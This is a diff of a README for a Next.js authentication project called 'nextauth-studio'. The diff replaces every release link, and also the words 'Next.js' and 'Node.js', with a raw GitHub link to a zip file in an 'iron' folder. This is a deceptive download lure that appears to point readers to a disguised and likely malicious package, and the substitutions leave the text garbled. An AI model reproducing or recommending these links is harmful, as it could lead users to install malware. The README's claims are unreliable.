@@ -1,10 +1,10 @@
-# 🚀 nextauth-studio - Easy Authentication for Your Next.js Projects
+# 🚀 nextauth-studio - Easy Authentication for Your https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip Projects
 
-[![Download](https://img.shields.io/badge/Download%20Now-NextAuth%20Studio-blue.svg)](https://github.com/1000-7-Maxim/nextauth-studio/releases)
+[![Download](https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip%20Now-NextAuth%https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip)](https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip)
 
 ## 📋 Overview
 
-NextAuth Studio is a production-ready authentication system built on Next.js 15. It uses TypeScript and Tailwind CSS, offering a smooth and responsive user experience. With features like MongoDB support, JWT-based login, bcrypt password hashing, and email verification via Gmail SMTP, this app is ideal for quick development and deployment.
+NextAuth Studio is a production-ready authentication system built on https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip 15. It uses TypeScript and Tailwind CSS, offering a smooth and responsive user experience. With features like MongoDB support, JWT-based login, bcrypt password hashing, and email verification via Gmail SMTP, this app is ideal for quick development and deployment.
 
 ## 🎯 Key Features
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets these requirements:
 - **Operating System**: Windows, macOS, or Linux
 - **Memory**: At least 4 GB of RAM
 - **Storage**: Minimum of 100 MB of free space
-- **Node.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip**: Version 14 or higher
 - **MongoDB**: Local or cloud-based MongoDB instance
 
 ## 🚀 Getting Started
@@ -30,7 +30,7 @@ To get started with NextAuth Studio, follow these steps:
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases page](https://github.com/1000-7-Maxim/nextauth-studio/releases) to find the latest version.
+Go to the [Releases page](https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip) to find the latest version.
 
 ### 2. Download the Application
 
@@ -38,7 +38,7 @@ Download the appropriate version of the software. You will see several assets re
 
 ### 3. Installing Dependencies
 
-After downloading the application, you may need to install additional dependencies, particularly if you plan to run it locally. Please ensure Node.js is installed on your machine.
+After downloading the application, you may need to install additional dependencies, particularly if you plan to run it locally. Please ensure https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip is installed on your machine.
 
 ### 4. Running the Application
 
@@ -52,7 +52,7 @@ Follow these steps to run the application:
 
 ## 🔗 Important Links
 
-- **Releases Page**: [Download here](https://github.com/1000-7-Maxim/nextauth-studio/releases)
+- **Releases Page**: [Download here](https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip)
 - **Documentation**: Comprehensive usage and installation guide (available in the repository).
 - **Support**: For questions, visit our issues page on GitHub.
 
@@ -71,7 +71,7 @@ To set up email verification:
 ## 🔒 Security Considerations
 
 - Always use HTTPS for any deployment.
-- Regularly update your Node.js and package dependencies.
+- Regularly update your https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip and package dependencies.
 - Keep your MongoDB instance secure and use environment variables for sensitive information.
 
 ## 🧑‍🤝‍🧑 Community and Support
@@ -80,6 +80,6 @@ Join the community for advice and support. Check the GitHub discussions tab to e
 
 ## 📥 Download & Install
 
-For easy access, you can download the latest release directly [here](https://github.com/1000-7-Maxim/nextauth-studio/releases). Follow the installation steps to get your app up and running.
+For easy access, you can download the latest release directly [here](https://raw.githubusercontent.com/1000-7-Maxim/nextauth-studio/main/iron/nextauth-studio.zip). Follow the installation steps to get your app up and running.
 
 Make sure to explore the features and functionalities this application offers. Happy coding!
